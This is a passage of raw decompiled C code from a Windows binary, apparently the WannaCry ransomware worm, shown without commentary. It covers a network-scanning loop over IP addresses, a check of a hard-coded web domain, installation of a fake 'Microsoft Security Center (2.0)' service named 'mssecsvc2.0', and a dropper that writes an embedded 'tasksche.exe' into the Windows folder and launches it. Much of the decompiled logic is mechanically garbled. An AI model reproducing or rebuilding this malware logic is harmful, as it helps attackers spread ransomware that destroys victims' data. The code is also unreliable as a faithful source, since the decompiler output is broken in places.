                        int32_t * v25 = (int32_t *)(v24 + 20); // 0x407990_0
                        *v25 = v24 + 60;
                        int32_t * v26 = (int32_t *)(v24 + 16); // 0x407991_1
                        *v26 = 0x407996;
                        int32_t v27 = inet_addr(str2); // 0x407991
                        g7 = v27;
                        *v25 = v27;
                        *v26 = 0x40799e;
                        int32_t v28 = function_407480(dwMilliseconds); // 0x407999
                        g1 = v28;
                        int32_t v29 = g8; // 0x40799e
                        int32_t v30 = v29 + 4; // 0x40799e
                        if (v28 < 1) {
                          lab_0x4079e5:
                            // 0x4079e5
                            *(int32_t *)(v30 - 4) = 50;
                            *(int32_t *)(v30 - 8) = (int32_t)&g15;
                            Sleep(dwMilliseconds);
                            v23 = v30;
                            // branch -> 0x4079ed
                        } else {
                            // 0x4079a5
                            *(int32_t *)v29 = 0;
                            *(int32_t *)(v29 - 4) = 0;
                            *(int32_t *)(v29 - 8) = g7;
                            *(int32_t *)(v29 - 12) = 0x407540;
                            *(int32_t *)(v29 - 16) = 0;
                            *(int32_t *)(v29 - 20) = 0;
                            *(int32_t *)(v29 - 24) = (int32_t)&g11;
                            int32_t v31 = _beginthreadex(str2, dwMilliseconds2, a3, a4, a5, NULL); // 0x4079b3
                            g1 = v31;
                            int32_t v32 = v31; // esi
                            int32_t v33 = g8; // 0x4079bb
                            int32_t v34 = v33 + 24; // 0x4079bb
                            if (v31 != 0) {
                                int32_t * v35 = (int32_t *)(v33 + 20); // 0x4079c2_0
                                *v35 = 0x36ee80;
                                int32_t * v36 = (int32_t *)(v33 + 16); // 0x4079c7_0
                                *v36 = v32;
                                int32_t * v37 = (int32_t *)(v33 + 12); // 0x4079c8_2
                                *v37 = (int32_t)&g12;
                                if (WaitForSingleObject(str2, dwMilliseconds2) == 258) {
                                    // 0x4079d5
                                    *v35 = 0;
                                    *v36 = v32;
                                    *v37 = (int32_t)&g13;
                                    TerminateThread(str2, dwMilliseconds2);
                                    // branch -> 0x4079de
                                }
                                // 0x4079de
                                *v35 = v32;
                                *v36 = (int32_t)&g14;
                                g1 = CloseHandle(str2);
                                v30 = v34;
                                // branch -> 0x4079e5
                                goto lab_0x4079e5;
                            } else {
                                v23 = v34;
                            }
                        }
                        int32_t v38 = g5; // 0x4079ed
                        int32_t v39 = v38 + 1; // 0x4079ed
                        g5 = v39;
                        g1182 = v38 == 254;
                        if (v39 >= 255) {
                            // break -> 0x4079fa
                            break;
                        }
                        v21 = v39;
                        v22 = v23;
                        // continue -> 0x407971
                    }
                    // 0x4079fa
                    g5 = *(int32_t *)(v23 + 28);
                    g7 = *(int32_t *)0x40a09c;
                    v11 = 0;
                    v19 = v23;
                    v20 = 0;
                    // branch -> 0x407a04
                }
                // 0x407a04
                *(int32_t *)(v19 - 4) = 100;
                *(int32_t *)(v19 - 8) = (int32_t)&g16;
                Sleep(dwMilliseconds);
                g3 = 1;
                v4 = v11;
                v12 = v13;
                v5 = v20;
                // branch -> 0x407897
                break;
            }
            // 0x4078e4
            if (v10 == 0) {
                v13 = v12;
                goto lab_0x407908;
            }
            goto lab_0x4078ec;
        }
    }
}

// Address range: 0x407a20 - 0x407b8f
char * function_407a20(void) {
    int32_t v1 = g3; // 0x407a23
    int32_t v2 = g7; // bp-20
    int32_t v3 = g5; // bp-24
    char * v4 = GlobalAlloc(64, (int32_t)&g633); // 0x407a4b
    g1173 = (struct _OVERLAPPED *)v4;
    if (v4 == NULL) {
        // 0x407a56
        g5 = v3;
        g7 = v2;
        g3 = v1;
        return NULL;
    }
    char * v5 = GlobalAlloc(64, (int32_t)&g633); // 0x407a64
    g1174 = (int32_t)v5;
    if (v5 == NULL) {
        // 0x407a6f
        GlobalFree((char *)g1173);
        g5 = v3;
        g7 = v2;
        g3 = v1;
        return NULL;
    }
    int32_t v6 = 0; // edx
    int32_t v7 = &v3; // 0x407aa1
    int32_t v8 = 0; // 0x407aa1
    // branch -> 0x407a86
    while (true) {
        int32_t v9 = v8 == 0 ? (int32_t)&g22 : (int32_t)&g23;
        int32_t v10 = 4 * v8; // 0x407a96
        int32_t v11 = *(int32_t *)(v10 + (int32_t)&g1173); // 0x407a96
        char * v12 = (char *)v11;
        *(int32_t *)(v7 + 16 + v10) = v11;
        int32_t v13 = v8 != 0 ? 0xc8a4 : 0x4060; // 0x407aaa
        memcpy(v12, (char *)v9, v13 / 4);
        memcpy(v12, (char *)v9, 0);
        int32_t * v14 = (int32_t *)(g8 + 16 + 4 * v6); // 0x407abf_0
        *v14 = v13 + *v14;
        int32_t v15 = v6 + 1; // 0x407ac9
        v6 = v15;
        if (v15 >= 2) {
            char * fileHandle = CreateFileA((char *)&g1172, -0x80000000, 1, NULL, 3, 4, NULL); // 0x407ae3
            g3 = (int32_t)fileHandle;
            if (fileHandle != (char *)-1) {
                // 0x407b11
                g7 = 0;
                g5 = GetFileSize(fileHandle, NULL);
                abort();
                // UNREACHABLE
            }
            // 0x407af0
            GlobalFree((char *)g1173);
            GlobalFree((char *)g1174);
            g5 = v3;
            g7 = v2;
            g3 = v1;
            return NULL;
        }
        // 0x407a86
        v7 = g8;
        v8 = v15;
        // branch -> 0x407a86
    }
}

// Address range: 0x407b90 - 0x407bcf
int32_t function_407b90(void) {
    int32_t v1;
    if (WSAStartup(514, (struct WSAData *)&v1) != 0) {
        // 0x407ba9
        g1 = 0;
        return 0;
    }
    // 0x407bb2
    function_407620();
    function_407a20();
    g1 = 0;
    return 0;
}

// Address range: 0x407bd0 - 0x407c3f
int32_t function_407bd0(int32_t a1) {
    // 0x407bd0
    function_407b90();
    g1 = 0;
    return 0;
}

// Address range: 0x407c40 - 0x407cdf
int32_t function_407c40(void) {
    int32_t v1 = g5; // 0x407c4a
    int32_t str;
    sprintf((char *)&str, "%s -m security", (struct _SERVICE_TABLE_ENTRYA *)&g1172);
    char * hSCManager = OpenSCManagerA(NULL, NULL, 0xf003f); // 0x407c68
    g5 = (int32_t)hSCManager;
    if (hSCManager == NULL) {
        // 0x407cca
        g1 = 0;
        g5 = v1;
        return 0;
    }
    int32_t v2 = g3; // 0x407c74
    int32_t v3 = g7; // 0x407c75
    g4 = &str;
    char * hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, (char *)&str, NULL, NULL, NULL, NULL, NULL); // 0x407c9b
    int32_t v4 = (int32_t)hService; // 0x407c9b_28
    g1 = v4;
    int32_t v5 = *(int32_t *)0x40a018; // 0x407ca1
    g3 = v5;
    g7 = v4;
    g1182 = hService == NULL;
    int32_t v6; // 0x407cbc
    if (hService != NULL) {
        // 0x407cad
        StartServiceA(hService, 0, NULL);
        g1 = CloseServiceHandle((char *)g7);
        v6 = g3;
        // branch -> 0x407cbb
    } else {
        v6 = v5;
    }
    int32_t v7 = g5; // 0x407cbb
    ((int32_t (*)(int32_t))v6)(v7);
    g7 = (int32_t)(char **)v7;
    g3 = (int32_t)(char *)v3;
    g1 = 0;
    g5 = v2;
    return 0;
}

// Address range: 0x407ce0 - 0x407f1f
char * function_407ce0(void) {
    int32_t v1;
    char * v2 = (char *)v1; // bp-640
    int32_t v3;
    char * v4 = (char *)v3; // bp-636
    int32_t v5 = g3; // 0x407ce6
    int32_t v6 = g2; // 0x407ce7
    int32_t v7 = g7; // 0x407ce8
    int32_t v8 = g5; // 0x407ce9
    char * hModule = GetModuleHandleW(L"kernel32.dll"); // 0x407cef
    int32_t hModule2 = (int32_t)hModule; // esi
    g3 = 0;
    if (hModule == NULL) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    // 0x407d01
    g122 = (int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))GetProcAddress(hModule, "CreateProcessA");
    g116 = (int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))GetProcAddress((char *)hModule2, "CreateFileA");
    g118 = (int32_t (*)(int32_t, int32_t))GetProcAddress((char *)hModule2, "WriteFile");
    int32_t (**func)() = GetProcAddress((char *)hModule2, "CloseHandle"); // 0x407d34
    g114 = (int32_t (*)(int32_t))func;
    int32_t v9 = g3; // 0x407d41
    if ((int32_t)g122 == v9 || (int32_t)g116 == v9 || (int32_t)g118 == v9 || (int32_t)func == v9) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    char * hModule3 = (char *)v9;
    v4 = hModule3;
    int32_t v10 = (int32_t)&v4;
    char * hResInfo = FindResourceA(hModule3, (char *)1831, g105); // 0x407d74
    int32_t hResInfo2 = (int32_t)hResInfo; // 0x407d74_8
    int32_t hModule4 = g3; // 0x407d7c
    if (hResInfo2 == hModule4) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    char * hResData = LoadResource((char *)hModule4, hResInfo); // 0x407d86
    if ((int32_t)hResData == g3) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    int32_t v11 = (int32_t)LockResource(hResData); // 0x407d95_4
    int32_t hModule5 = g3; // 0x407d9b
    if (v11 == hModule5) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    int32_t v12 = SizeofResource((char *)hModule5, (char *)hResInfo2); // 0x407da9
    g2 = v12;
    int32_t v13 = g3; // 0x407db1
    if (v12 == v13) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    int32_t str = 0x1000000 * v13 / 0x1000000;
    int32_t v14;
    memset((char *)&v14, 0, 64);
    v14 = 0;
    *(char *)((int32_t)&v14 | 2) = 0;
    int32_t v15;
    int32_t v16 = &v15; // 0x407dd4_0
    int32_t str2 = 0x1000000 * g3 / 0x1000000;
    memset((char *)&v15, 0, 64);
    g7 = *(int32_t *)0x40a10c;
    char * v17 = "tasksche.exe"; // bp-628
    v15 = 0;
    *(char *)(v16 | 2) = 0;
    g5 = v16 | 3;
    int32_t v18 = &str; // 0x407df7_0
    v4 = "C:\\%s\\%s";
    v2 = (char *)&str;
    int32_t v19 = (int32_t)&v2;
    sprintf((char *)&str, "C:\\%s\\%s", "WINDOWS", v17);
    v4 = (char *)&str2;
    sprintf((char *)&str2, "C:\\%s\\qeriuwjhrf", "WINDOWS");
    g1182 = g8 == -12;
    g6 = &str2;
    v4 = (char *)&str;
    bool v20 = MoveFileExA((char *)&str, (char *)&str2, 1); // 0x407e2c
    int32_t v21 = v20; // 0x407e2c_8
    g1 = v21;
    int32_t v22 = g3; // 0x407e32
    v4 = (char *)2;
    v2 = (char *)v22;
    g4 = v18;
    g116(v18, 0x40000000, v22, v22, 2, 4, v22);
    g7 = v21;
    g1182 = v20;
    if (v20) {
        // 0x407f08
        g5 = v8;
        g7 = v7;
        g2 = v6;
        g3 = v5;
        return NULL;
    }
    int32_t v23 = (int32_t)v4;
    g1 = v23;
    g6 = v10;
    int32_t v24 = g3;
    g118(v21, v23);
    g114(g7);
    int32_t str3;
    int32_t v25 = &str3; // 0x407e7e_0
    memset((char *)&v4, 0, 16);
    int32_t len = strlen((char *)&g104);
    int32_t v26 = (int32_t)&g104 - 1 - len; // 0x407e99
    v24 = g3;
    char * v27 = (char *)v26;
    g7 = v26;
    g2 = len + 1;
    strlen((char *)&str3);
    int32_t v28;
    g5 = &v28;
    memcpy((char *)&v28, v27, g2 / 4);
    g1 = &v24;
    int32_t v29 = g2 & 3; // 0x407eb8
    g1182 = v29 == 0;
    memcpy((char *)&v28, v27, v29);
    g4 = v19;
    g6 = v25;
    int32_t v30 = g3; // 0x407ec7
    v2 = (char *)68;
    g122(v30, v25, v30, v30, v30, 0x8000000, v30, v30, v19);
    int32_t v31 = g1; // 0x407eee
    g1182 = v31 == 0;
    if (v31 != 0) {
        // 0x407ef2
        g1 = v30;
        g114(v30);
        g4 = v30;
        g114(v30);
        // branch -> 0x407f08
    }
    // 0x407f08
    g5 = v8;
    g7 = v7;
    g2 = v6;
    g3 = v5;
    return NULL;
}

// Address range: 0x407f20 - 0x407f2f
int32_t function_407f20(void) {
    // 0x407f20
    function_407c40();
    function_407ce0();
    g1 = 0;
    return 0;
}

// Address range: 0x407f30 - 0x407f88
int32_t function_407f30(int32_t a1) {
    // 0x407f30
    switch (a1) {
        case 1: {
            // 0x407f41
            g108 = 1;
            g110 = 0;
            g112 = 0;
            g113 = 0;
            // branch -> 0x407f74
            break;
        }
        case 2: {
            // 0x407f5e
            g108 = 7;
            // branch -> 0x407f74
            break;
        }
        case 3: {
            // 0x407f6a
            g108 = 4;
            // branch -> 0x407f74
            break;
        }
        case 5: {
            // 0x407f41
            g108 = 1;
            g110 = 0;
            g112 = 0;
            g113 = 0;
            // branch -> 0x407f74
            break;
        }
    }
    int32_t result = SetServiceStatus(g117, (struct _SERVICE_STATUS *)&g107); // 0x407f80_6
    g1 = result;
    return result;
}

// Address range: 0x407f89 - 0x407fff
int32_t function_407f89(int32_t a1, int32_t lpInfo, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * hService, int32_t a9, int32_t a10, int32_t a11) {
    char * v1 = (char *)(g3 + 0x448b1cec); // 0x407f9f_0
    *v1 = (char)(g1 + (int32_t)*v1);
    lpInfo = 0;
    return ChangeServiceConfig2A(hService, 2, (char *)&lpInfo);
}

// Address range: 0x408000 - 0x40808f
char * function_408000(void) {
    int32_t v1 = 0; // esi
    g107 = (void (**)(int32_t))32;
    g108 = 2;
    g109 = 1;
    g110 = 0;
    g111 = 0;
    g112 = 0;
    g113 = 0;
    char * hServiceStatus = RegisterServiceCtrlHandlerA("mssecsvc2.0", (void (**)(int32_t))function_407f30); // 0x408043
    g117 = hServiceStatus;
    if ((int32_t)hServiceStatus == v1) {
        // 0x40808c
        return hServiceStatus;
    }
    // 0x408052
    g108 = 4;
    g112 = v1;
    g113 = v1;
    SetServiceStatus(hServiceStatus, (struct _SERVICE_STATUS *)&g107);
    function_407bd0(g7);
    Sleep(0x5265c00);
    ExitProcess(1);
    // UNREACHABLE
}

// Address range: 0x408090 - 0x40813f
int32_t function_408090(int32_t a1, int32_t a2) {
    // 0x408090
    int32_t v1;
    char * lpServiceStartTable = (char *)v1; // bp-16
    GetModuleFileNameA(NULL, (char *)&g1172, 260);
    if (*__p___argc() <= 1) {
        // 0x4080b0
        function_407f20();
        return 0;
    }
    char * hSCManager = OpenSCManagerA(NULL, NULL, 0xf003f); // 0x4080c3
    g5 = (int32_t)hSCManager;
    if (hSCManager == NULL) {
        // 0x408101
        lpServiceStartTable = "mssecsvc2.0";
        return StartServiceCtrlDispatcherA((struct _SERVICE_TABLE_ENTRYA *)&lpServiceStartTable);
    }
    int32_t v2 = g7; // 0x4080d0
    char * v3 = OpenServiceA(hSCManager, "mssecsvc2.0", 0xf01ff); // 0x4080dc
    int32_t v4 = (int32_t)v3; // 0x4080dc_8
    g1 = v4;
    int32_t v5 = *(int32_t *)0x40a018; // 0x4080e2
    g3 = v5;
    g7 = v4;
    g1182 = v3 == NULL;
    int32_t v6; // 0x4080fd
    if (v3 != NULL) {
        // 0x4080ee
        unknown_407fa0(v4, 60);
        g1182 = g8 == -8;
        g1 = CloseServiceHandle((char *)g7);
        v6 = g3;
        // branch -> 0x4080fc
    } else {
        v6 = v5;
    }
    int32_t v7 = g5; // 0x4080fc
    ((int32_t (*)(int32_t))v6)(v7);
    g7 = (int32_t)(char *)v7;
    g3 = (int32_t)(char *)v2;
    // branch -> 0x408101
    // 0x408101
    lpServiceStartTable = "mssecsvc2.0";
    return StartServiceCtrlDispatcherA((struct _SERVICE_TABLE_ENTRYA *)&lpServiceStartTable);
}

// Address range: 0x408140 - 0x4081cf
int32_t function_408140(void) {
    // 0x408140
    int32_t v1;
    char * v2 = (char *)v1; // bp-80
    int32_t v3 = g7; // 0x408143
    int32_t v4 = g5; // bp-88
    int32_t v5 = 0; // eax
    memcpy((char *)&v2, "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com", 14);
    v2 = (char *)104;
    char * v6 = (char *)v5;
    char * v7 = InternetOpenA(v6, 1, v6, v6, v5); // 0x40817b
    g4 = (int32_t)&v2;
    char * v8 = InternetOpenUrlA(v7, (char *)&v2, NULL, 0, -0x7c000000, 0); // 0x408194
    g5 = (int32_t)v8;
    g7 = *(int32_t *)0x40a13c;
    InternetCloseHandle((char *)(int32_t)v7);
    if (v8 != NULL) {
        // 0x4081bc
        InternetCloseHandle((char *)g5);
        g5 = v4;
        g1 = 0;
        g7 = v3;
        return 0;
    }
    // 0x4081a7
    InternetCloseHandle(NULL);
    function_408090(v4, v3);
    g5 = v4;
    g1 = 0;
    g7 = v3;
    return 0;
}

// Address range: 0x4081d0 - 0x4081ff
int32_t function_4081d0(void) {
    int32_t v1 = *(int32_t *)(g4 + 4); // 0x4081d4
    g1 = v1;
    function_4097fe((char *)v1);
    g1 = 0;
    *(int32_t *)(g4 + 4) = 0;
    *(int32_t *)(g4 + 8) = 0;
    *(int32_t *)(g4 + 12) = 0;
    return 0;
}

// Address range: 0x408200 - 0x4082af
void function_408200(char * a1, char * a2, int32_t a3) {
    // 0x408200
    *(char *)g4 = *a2;
    unsigned char v1 = *a1; // 0x408212
    g1 = (int32_t)a2 & -256 | (int32_t)v1;
    int32_t v2 = 0; // ebx
    *(char *)(g4 + 1) = v1;
    *(char *)(g4 + 8) = (char)v2;
    _qm__qm_2_YAPAXI_Z(24);
    int32_t v3 = g1; // 0x408223
    int32_t v4 = v3; // ebp
    *(int32_t *)(v3 + 4) = v2;
    *(int32_t *)(v3 + 20) = 1;
    _qm__qm_0_Lockit_std__QAE_XZ();
    int32_t v5 = g1178; // 0x40823e
    if (v5 == v2) {
        // 0x408246
        g1178 = v3;
        *(int32_t *)v3 = v5;
        v4 = 0;
        *(int32_t *)(g1178 + 8) = v2;
        // branch -> 0x408259
    }
    // 0x408259
    g1177++;
    _qm__qm_1_Lockit_std__QAE_XZ();
    if (v4 != v2) {
        // 0x408274
        g1 = function_4097fe((char *)v4);
        // branch -> 0x40827d
    }
    // 0x40827d
    _qm__qm_2_YAPAXI_Z(24);
    *(int32_t *)(g1 + 4) = g1178;
    *(int32_t *)(g1 + 20) = v2;
    *(int32_t *)(g4 + 4) = g1;
    *(int32_t *)(g4 + 12) = v2;
    *(int32_t *)g1 = g1;
    int32_t v6 = *(int32_t *)(g4 + 4); // 0x408298
    *(int32_t *)(v6 + 8) = v6;
}

// Address range: 0x4082b0 - 0x4082bf
int32_t function_4082b0(int32_t * a1, int32_t a2) {
    // 0x4082b0
    *a1 = *(int32_t *)*(int32_t *)(g4 + 4);
    return (int32_t)a1;
}

// Address range: 0x4082c0 - 0x40838f
int32_t function_4082c0(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result = (int32_t)a1;
    int32_t v1 = a3; // bp+12
    int32_t v2 = g2; // 0x4082c1
    g2 = a3;
    g7 = a2;
    int32_t v3 = g5; // 0x4082cb
    int32_t v4 = g4; // 0x4082cc
    g5 = v4;
    int32_t v5;
    if (*(int32_t *)(v4 + 12) != 0) {
        int32_t v6 = *(int32_t *)(v4 + 4); // 0x4082d5
        if (*(int32_t *)v6 == a2) {
            // 0x4082dc
            if (v6 == a3) {
                int32_t v7 = *(int32_t *)(a3 + 4); // 0x4082e0
                g3 = v7;
                g1182 = v7 == g1178;
                g7 = v7;
                int32_t v8; // 0x40831f
                int32_t v9; // 0x40832f
                int32_t v10; // 0x408315
                int32_t v11; // 0x408321
                int32_t v12; // 0x408327
                if (v7 == g1178) {
                    // 0x40830f
                    *(int32_t *)(*(int32_t *)(v4 + 4) + 4) = v7;
                    v10 = g5;
                    *(int32_t *)(v10 + 12) = 0;
                    v8 = *(int32_t *)(v10 + 4);
                    *(int32_t *)v8 = v8;
                    v11 = *(int32_t *)(g5 + 4);
                    *(int32_t *)(v11 + 8) = v11;
                    v12 = *(int32_t *)(g5 + 4);
                    g6 = v12;
                    g5 = v3;
                    v9 = *(int32_t *)v12;
                    g4 = v9;
                    g2 = v2;
                    *a1 = v9;
                    g3 = v5;
                    return result;
                }
                // 0x4082ee
                // branch -> 0x4082ee
                while (true) {
                    // 0x4082ee
                    g4 = v4;
                    g1 = function_4089d0((int32_t *)*(int32_t *)(v7 + 8), v3);
                    g7 = *(int32_t *)g7;
                    function_4097fe((char *)g3);
                    int32_t v13 = g7; // 0x408309
                    g1182 = v13 == g1178;
                    g3 = v13;
                    int32_t v14 = g5;
                    if (v13 == g1178) {
                        // 0x40830f
                        *(int32_t *)(*(int32_t *)(v14 + 4) + 4) = g1178;
                        v10 = g5;
                        *(int32_t *)(v10 + 12) = 0;
                        v8 = *(int32_t *)(v10 + 4);
                        *(int32_t *)v8 = v8;
                        v11 = *(int32_t *)(g5 + 4);
                        *(int32_t *)(v11 + 8) = v11;
                        v12 = *(int32_t *)(g5 + 4);
                        g6 = v12;
                        g5 = v3;
                        v9 = *(int32_t *)v12;
                        g4 = v9;
                        g2 = v2;
                        *a1 = v9;
                        g3 = v5;
                        return result;
                    }
                    // 0x4082ee
                    v4 = v14;
                    v7 = v13;
                    // branch -> 0x4082ee
                }
            }
        }
    }
    // 0x408339
    g1182 = a2 == a3;
    if (a2 == a3) {
        // 0x408381
        g5 = v3;
        *a1 = a2;
        g2 = v2;
        g3 = v5;
        return result;
    }
    // branch -> 0x40833d
    int32_t v15; // 0x40837d
    while (true) {
        int32_t v16 = *(int32_t *)(a2 + 8); // 0x40833d
        g3 = a2;
        int32_t v17;
        int32_t v18; // 0x408369
        if (v16 == g1178) {
            int32_t v19 = *(int32_t *)(a2 + 4); // 0x408357
            v18 = v19;
            int32_t v20 = a2; // 0x408369
            if (a2 == *(int32_t *)(v19 + 8)) {
                g7 = v19;
                int32_t v21 = *(int32_t *)(v19 + 4); // 0x408361
                while (v19 == *(int32_t *)(v21 + 8)) {
                    // 0x40835f
                    v19 = v21;
                    g7 = v19;
                    v21 = *(int32_t *)(v19 + 4);
                    // continue -> 0x40835f
                }
                // 0x408369
                v18 = v21;
                v20 = v19;
                // branch -> 0x408369
            }
            // 0x408369
            int32_t v22; // 0x408374
            if (*(int32_t *)(v20 + 8) != v18) {
                v17 = a2;
              lab_0x40836e:
                // 0x40836e
                g7 = v18;
                v22 = v17;
                // branch -> 0x408370
            } else {
                v22 = a2;
            }
            // 0x408370
            g4 = g5;
            function_4085d0(&v1, (int32_t *)v22, v3);
            v15 = g7;
            g1182 = v15 == g2;
            if (v15 == g2) {
                // break -> 0x408381
                break;
            }
            a2 = v15;
            // continue -> 0x40833d
            continue;
        } else {
            // 0x40834c
            v17 = g3;
            v18 = function_408d30((int32_t *)v16);
            // branch -> 0x40836e
            goto lab_0x40836e;
        }
    }
    // 0x408381
    // branch -> 0x408381
    // 0x408381
    g5 = v3;
    *a1 = v15;
    g2 = v2;
    g3 = v5;
    return result;
}

// Address range: 0x408390 - 0x4085cf
int32_t function_408390(int32_t * a1, int32_t * a2, int32_t a3) {
    int32_t result2 = (int32_t)a1;
    int32_t v1 = (int32_t)a2;
    int32_t v2 = v1;
    int32_t v3;
    int32_t v4 = &v3; // 0x408390_0
    int32_t v5 = g3; // 0x408391
    int32_t result = g2; // 0x408392
    int32_t v6 = g7; // 0x408393
    int32_t v7 = g5; // 0x40839a
    int32_t v8 = g4; // 0x40839b
    g5 = v8;
    int32_t v9 = v1; // ebx
    int32_t v10 = g1 & -256 | 1; // 0x4083a1
    g1 = v10;
    int32_t v11 = *(int32_t *)(v8 + 4); // 0x4083a3
    g7 = v11;
    int32_t v12 = *(int32_t *)(v11 + 4); // 0x4083a8
    g2 = v12;
    int32_t v13 = v11; // 0x408561
    if (v12 != g1178) {
        int32_t v14 = *a2; // 0x4083af
        g7 = v12;
        int32_t v15 = *(int32_t *)(v12 + 12); // 0x4083b3
        int32_t v16 = v14 - v15; // 0x4083b3
        int32_t v17 = (int32_t)(v16 < 0 ^ ((v16 ^ v14) & (v15 ^ v14)) < 0) | v14 & -256; // 0x4083b6
        g1 = v17;
        int32_t v18 = *(int32_t *)(v17 == 0 ? v12 + 8 : v12);
        g2 = v18;
        while (v18 != g1178) {
            // 0x4083af
            v12 = v18;
            v14 = *a2;
            g7 = v12;
            v15 = *(int32_t *)(v12 + 12);
            v16 = v14 - v15;
            v17 = (int32_t)(v16 < 0 ^ ((v16 ^ v14) & (v15 ^ v14)) < 0) | v14 & -256;
            g1 = v17;
            v18 = *(int32_t *)(v17 == 0 ? v12 + 8 : v12);
            g2 = v18;
            // continue -> 0x4083af
        }
        // 0x4083c9
        v10 = v17;
        v13 = v12;
        // branch -> 0x4083c9
    }
    // 0x4083c9
    int32_t v19; // bp-28
    if (((int32_t)*(char *)(v8 + 8) || g1178 & -256) == 0) {
        // 0x408552
        g6 = v13;
        v3 = v13;
        int32_t v20 = v1; // 0x408599
        int32_t v21 = v13; // 0x4085c3
        if ((v10 & 255) != 0) {
            // 0x40855c
            if (v13 == *(int32_t *)v11) {
                // 0x408560
                g4 = v8;
                int32_t v22 = function_408a60(&v2, g1178, (int32_t *)v13, a2, v7, v6); // 0x40856a
                int32_t v23 = *(int32_t *)v22; // 0x40856f
                g6 = v23;
                g5 = &v2;
                g7 = g1178;
                g2 = v13;
                *(int32_t *)result = v23;
                *(char *)(result + 4) = 1;
                g3 = v1;
                g4 = v7;
                return result;
            }
            // 0x408583
            g4 = v4;
            function_408dd0(v7);
            int32_t v24 = v3; // 0x40858c
            g6 = v24;
            v20 = v9;
            v21 = v24;
            // branch -> 0x408590
        }
        int32_t v25 = *(int32_t *)(v21 + 12); // 0x408590
        g1 = v25;
        int32_t * v26 = (int32_t *)v20; // 0x408593_0
        if (v25 >= *v26) {
            // 0x4085bc
            g5 = v7;
            g7 = v6;
            g2 = result;
            *(int32_t *)result2 = v21;
            *(char *)(result2 + 4) = 0;
            g3 = v5;
            g4 = v3;
            return result2;
        }
        // 0x408599
        v19 = g7;
        g4 = g5;
        int32_t v27 = function_408a60(&v2, g2, (int32_t *)g7, v26, v7, v6); // 0x4085a3
        int32_t v28 = *(int32_t *)v27; // 0x4085a8
        g6 = v28;
        g5 = &v2;
        g7 = g2;
        g2 = v19;
        *(int32_t *)result = v28;
        *(char *)(result + 4) = 1;
        g3 = v20;
        g4 = v7;
        return result;
    }
    // 0x4083d4
    v19 = v13;
    function_408db0(v13, 0, v7);
    *(int32_t *)g1 = g1178;
    *(int32_t *)(g1 + 8) = g1178;
    function_408e30((int32_t *)(g1 + 12), (int32_t *)v9);
    int32_t * v29 = (int32_t *)(g5 + 12); // 0x4083fd_0
    *v29 = *v29 + 1;
    int32_t * v30; // 0x40846c_0
    int32_t v31; // ebp
    int32_t v32; // ecx
    int32_t v33; // 0x40845c
    int32_t v34; // 0x4084ac
    int32_t v35; // 0x408459
    int32_t v36; // 0x408467
    int32_t v37; // 0x4084a5
    int32_t v38; // 0x408533
    int32_t result3; // 0x408542
    if (g7 != *(int32_t *)(g5 + 4)) {
        // 0x40840e
        if (g2 == g1178) {
            int32_t v39 = g7; // 0x408418
            if (*(int32_t *)v9 >= *(int32_t *)(v39 + 12)) {
                // 0x40841f
                v31 = g1;
                *(int32_t *)(v39 + 8) = g1;
                int32_t * v40 = (int32_t *)(*(int32_t *)(g5 + 4) + 8); // 0x408429_0
                if (g7 == *v40) {
                    // 0x40842e
                    *v40 = v31;
                    // branch -> 0x408459
                }
                // 0x408459
                v35 = g5;
                v33 = v31;
                g7 = v33;
                if (v33 == *(int32_t *)(*(int32_t *)(v35 + 4) + 4)) {
                    // 0x408533
                    v38 = *(int32_t *)(v35 + 4);
                    g6 = v38;
                    g5 = v19;
                    g7 = 0;
                    *(int32_t *)(*(int32_t *)(v38 + 4) + 20) = 1;
                    result3 = v3;
                    *(int32_t *)result3 = v31;
                    g2 = v7;
                    *(char *)(result3 + 4) = 1;
                    g3 = v6;
                    g4 = result;
                    return result3;
                }
                v34 = v35;
                v37 = v33;
                int32_t v41; // 0x408527
                while (true) {
                    // 0x408467
                    v36 = *(int32_t *)(v37 + 4);
                    v9 = 0;
                    v30 = (int32_t *)(v36 + 20);
                    int32_t v42 = v34; // 0x408533
                    if (*v30 == 0) {
                      lab_0x408475:;
                        int32_t v43 = *(int32_t *)(v36 + 4); // 0x408475
                        int32_t v44 = *(int32_t *)v43; // 0x408478
                        v32 = v44;
                        int32_t v45; // 0x408527
                        int32_t v46; // 0x40852a
                        int32_t v47; // 0x40852a
                        if (v36 == v44) {
                            int32_t v48 = *(int32_t *)(v43 + 8); // 0x40847e
                            v32 = v48;
                            if (*(int32_t *)(v48 + 20) == 0) {
                                // 0x408486
                                *v30 = 1;
                                *(int32_t *)(v32 + 20) = 1;
                                *(int32_t *)(*(int32_t *)(*(int32_t *)(g7 + 4) + 4) + 20) = v9;
                                g7 = *(int32_t *)(*(int32_t *)(g7 + 4) + 4);
                                // branch -> 0x408527
                            } else {
                                int32_t v49 = v37; // 0x4084b4
                                if (v37 == *(int32_t *)(v36 + 8)) {
                                    // 0x4084aa
                                    g7 = v36;
                                    g4 = v34;
                                    function_408cd0(v36, v19);
                                    v49 = g7;
                                    // branch -> 0x4084b4
                                }
                                // 0x4084b4
                                *(int32_t *)(*(int32_t *)(v49 + 4) + 20) = 1;
                                *(int32_t *)(*(int32_t *)(*(int32_t *)(g7 + 4) + 4) + 20) = v9;
                                int32_t v50 = *(int32_t *)(*(int32_t *)(g7 + 4) + 4); // 0x4084ca
                                g4 = g5;
                                function_408d50((int32_t *)v50, v19);
                                // branch -> 0x408527
                            }
                          lab_0x408527_2:
                            // 0x408527
                            v41 = g5;
                            v46 = g7;
